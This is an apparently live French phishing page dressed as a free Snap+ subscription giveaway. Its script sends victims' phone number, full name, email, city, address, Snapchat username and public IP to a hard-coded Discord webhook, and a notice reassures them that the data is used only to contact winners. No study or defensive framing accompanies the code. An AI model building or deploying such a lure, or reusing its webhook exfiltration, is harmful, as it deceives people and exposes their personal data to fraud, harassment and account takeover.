<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>üéÅ Snap+ 1 An Gratuit</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1a0033, #2c014d);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(44, 1, 77, 0.85);
      border: 2px solid #a54ffb;
      border-radius: 20px;
      padding: 30px 25px;
      text-align: center;
      width: 340px;
      box-shadow: 0 0 20px #a54ffb;
      position: relative;
      animation: pulseBorder 2s infinite;
    }
    @keyframes pulseBorder {
      0% { box-shadow: 0 0 10px #a54ffb; }
      50% { box-shadow: 0 0 25px #a54ffb; }
      100% { box-shadow: 0 0 10px #a54ffb; }
    }
    .logo {
      font-size: 70px;
      margin-bottom: 5px;
      text-shadow: 0 0 10px #fff;
    }
    h1 {
      font-size: 24px;
      margin: 0 0 15px;
      letter-spacing: 1px;
    }
    p {
      font-size: 15px;
      color: #ddd;
      margin-bottom: 25px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background-color: transparent;
      color: white;
      font-size: 15px;
      outline: none;
    }
    input::placeholder {
      color: #ccc;
    }
    button {
      width: 100%;
      background: #a54ffb;
      border: none;
      border-radius: 10px;
      color: white;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 12px;
      box-shadow: 0 0 10px #a54ffb;
      transition: 0.3s;
    }
    button:hover {
      background: #8b3ddb;
      box-shadow: 0 0 20px #c177ff;
    }
    .notice {
      font-size: 12px;
      margin-top: 15px;
      color: #bbb;
    }
    #step2 {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">üëª‚ú®</div>
    <h1>Snap+ Gratuit</h1>
    <p>Active 1 an de Snap+ gratuitement</p>

    <form id="giveawayForm">
      <div id="step1">
        <input
          type="text"
          name="telephone"
          placeholder="Num√©ro de t√©l√©phone"
          required
          pattern="[\d\s+]{6,}"
          title="Entrez un num√©ro valide"
        />
        <button type="button" onclick="showStep2()">Continuer</button>
      </div>

      <div id="step2">
        <input type="text" name="nom" placeholder="Nom" required />
        <input type="text" name="prenom" placeholder="Pr√©nom" required />
        <input type="email" name="email" placeholder="Email" required />
        <input type="text" name="ville" placeholder="Ville" required />
        <input type="text" name="departement" placeholder="D√©partement" required />
        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
        <button type="submit">Valider</button>
      </div>
    </form>

    <div class="notice">
      Les donn√©es sont utilis√©es uniquement pour vous contacter si vous gagnez. Ce concours
      n‚Äôest pas affili√© √† Snapchat.
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
    const SUBMISSION_LIMIT = 2;
    const TIME_WINDOW_MINUTES = 30;

    function showStep2() {
      const phoneInput = document.querySelector('[name="telephone"]');
      if (!phoneInput.value.trim()) {
        alert("Veuillez entrer votre num√©ro de t√©l√©phone.");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip || "IP inconnue";
      } catch {
        return "IP inconnue";
      }
    }

    function canSubmit() {
      const now = Date.now();
      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
      if (recent.length >= SUBMISSION_LIMIT) return false;
      recent.push(now);
      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
      return true;
    }

    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      if (!canSubmit()) {
        alert(`Vous avez d√©pass√© la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
        return;
      }

      const data = new FormData(this);
      const ip = await getPublicIP();

      const embed = {
        title: "üéÅ Nouvelle participation Snap+",
        color: 0xA54FFB,
        fields: [
          { name: "üìû T√©l√©phone", value: data.get("telephone") || "N/A", inline: true },
          { name: "üë§ Nom", value: data.get("nom") || "N/A", inline: true },
          { name: "üë§ Pr√©nom", value: data.get("prenom") || "N/A", inline: true },
          { name: "üìß Email", value: data.get("email") || "N/A", inline: false },
          { name: "üèôÔ∏è Ville", value: data.get("ville") || "N/A", inline: true },
          { name: "üìç D√©partement", value: data.get("departement") || "N/A", inline: true },
          { name: "üè† Adresse", value: data.get("adresse") || "Non fournie", inline: false },
          { name: "üëª Snapchat", value: data.get("snap") || "N/A", inline: true },
          { name: "üåê IP", value: ip, inline: false }
        ],
        footer: {
          text: `Re√ßu le ${new Date().toLocaleString("fr-FR")}`,
        },
        timestamp: new Date(),
      };

      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      })
      .then((res) => {
        if (!res.ok) throw new Error("Erreur lors de l'envoi");
        window.location.href = "merci.html";
      })
      .catch((err) => {
        alert("Erreur lors de l‚Äôenvoi. R√©essayez.");
        console.error(err);
      });
    });
  </script>
</body>
</html>
